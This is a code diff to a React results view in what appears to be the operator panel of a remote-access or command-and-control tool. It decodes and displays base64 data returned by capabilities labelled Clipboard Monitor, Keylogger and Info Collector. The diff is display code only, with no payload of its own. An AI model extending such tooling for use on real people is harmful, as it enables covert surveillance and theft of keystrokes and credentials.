@@ -43,6 +43,15 @@ function Results() {
     }
   };
 
+  // Decode base64 to text
+  const decodeBase64 = (base64Str) => {
+    try {
+      return atob(base64Str);
+    } catch (e) {
+      return null;
+    }
+  };
+
   // Detect data type from base64
   const detectDataType = (base64Str) => {
     if (!base64Str) return null;
@@ -69,10 +78,42 @@ function Results() {
   };
 
   // Render base64 data based on type
-  const renderBase64Data = (result) => {
+  const renderBase64Data = (result, capability) => {
     const dataType = detectDataType(result);
     
     if (!dataType) {
+      // Try to decode as text for text-based capabilities
+      const decodedText = decodeBase64(result);
+      
+      // Capabilities that return base64-encoded text:
+      // 2 = Clipboard Monitor
+      // 3 = Keylogger
+      // 5 = Info Collector
+      const textBasedCapabilities = [2, 3, 5];
+      
+      if (decodedText && textBasedCapabilities.includes(capability)) {
+        return (
+          <div>
+            <p><strong>Decoded Text Data</strong></p>
+            <textarea
+              readOnly
+              rows="15"
+              value={decodedText}
+              style={{ fontFamily: 'monospace', fontSize: '12px', width: '100%', whiteSpace: 'pre-wrap' }}
+            />
+            <details style={{ marginTop: '10px' }}>
+              <summary style={{ cursor: 'pointer', color: '#007bff' }}>Show Raw Base64</summary>
+              <textarea
+                readOnly
+                rows="10"
+                value={result}
+                style={{ fontFamily: 'monospace', fontSize: '12px', width: '100%', marginTop: '10px' }}
+              />
+            </details>
+          </div>
+        );
+      }
+      
       return (
         <div>
           <p><strong>Base64 Data</strong> (Type: Unknown)</p>
@@ -250,7 +291,7 @@ function Results() {
           <div className="form-group">
             <label>Result Data</label>
             {isBase64(selectedResult.result) 
-              ? renderBase64Data(selectedResult.result)
+              ? renderBase64Data(selectedResult.result, selectedResult.capability)
               : (
                 <textarea
                   readOnly
